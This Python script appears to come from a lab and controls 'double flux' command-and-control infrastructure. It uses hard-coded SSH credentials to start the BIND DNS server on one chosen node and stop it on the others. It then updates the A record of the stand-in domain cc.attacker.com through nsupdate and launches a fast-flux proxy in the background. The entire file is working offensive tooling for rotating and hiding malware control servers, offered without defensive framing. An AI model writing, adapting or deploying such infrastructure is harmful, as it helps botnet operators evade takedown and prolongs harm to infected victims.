import paramiko
import subprocess
import sys
import time

servers = {
    'FFA1': '10.0.6.1',
    'FFA2': '10.0.7.1',
    'FFA3': '10.0.8.1'
}

username = 'test'
password = 'test'

def execute_remote_command(hostname, command):
    """Connects to a server via SSH and executes a command."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        print(f"Executing command '{command}' on {hostname}...")
        
        try:
            stdout_data = stdout.read().decode()
            stderr_data = stderr.read().decode()
            print(stdout_data)
            print(stderr_data)
        except Exception:
            print("Command sent to run in background, no output expected.")
        
        client.close()
    except Exception as e:
        print(f"Error connecting to {hostname}: {e}")

def run_local_nsupdate(selected_ip):
    """
    Dynamically creates and runs the nsupdate command locally on C&C Server.
    """
    # Determine which IP to add to the DNS record based on the selected server
    if selected_ip == servers['FFA1']:
        ip_to_add = servers['FFA2']
    elif selected_ip == servers['FFA2']:
        ip_to_add = servers['FFA3']
    elif selected_ip == servers['FFA3']:
        ip_to_add = servers['FFA1']

    # The nsupdate command as a multi-line string
    nsupdate_script = f"""
server {selected_ip}
update del cc.attacker.com A
update add cc.attacker.com 60 A {ip_to_add}
send
"""
    print(f"\nPerforming nsupdate on C2 for server {selected_ip}...")
    try:
        command = f"nsupdate -k /home/ns-attacker-key.txt"
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=nsupdate_script)
        print(stdout)
        print(stderr)
        if process.returncode != 0:
            print(f"nsupdate failed with return code {process.returncode}")
    except Exception as e:
        print(f"Error running nsupdate locally: {e}")

def main():
    """Main function to control the DNS servers"""
    if len(sys.argv) != 2:
        print("Usage: python3 double_flux_choose_FFAs.py <selected_ip>")
        sys.exit(1)

    selected_ip = sys.argv[1]

    if selected_ip not in servers.values():
        print(f"Error: IP address {selected_ip} not found in server list.")
        sys.exit(1)

    selected_server_name = [name for name, ip in servers.items() if ip == selected_ip][0]
    print(f"Selected DNS server: {selected_server_name} ({selected_ip})")

    kill_command = "sudo pkill named"
    start_command = "sudo named -c /etc/bind/named.conf"
    
    # Determine the IP of the server that will be registered
    if selected_ip == servers['FFA1']:
        ip_to_register = servers['FFA2']
    elif selected_ip == servers['FFA2']:
        ip_to_register = servers['FFA3']
    elif selected_ip == servers['FFA3']:
        ip_to_register = servers['FFA1']

    # The command to run the fast_flux_proxy_FFA script in the background
    proxy_command = "nohup sudo python3 /home/fast_flux_proxy_FFA.py > /dev/null 2>&1 &"

    for name, ip in servers.items():
        if ip == selected_ip:
            print(f"\nTurning on {name}...")
            execute_remote_command(ip, start_command)
        else:
            print(f"\nTurning off {name}...")
            execute_remote_command(ip, kill_command)
    
    run_local_nsupdate(selected_ip)
    
    # Run the fast_flux_proxy_FFA.py script in the background on the registered server
    print(f"\nRunning fast_flux_proxy_FFA.py in the background on the registered server ({ip_to_register})...")
    execute_remote_command(ip_to_register, proxy_command)
    
    # Add a small delay to ensure the background command starts before the script exits
    time.sleep(2)
    #print("\nScript has finished execution.")

if __name__ == "__main__":
    main()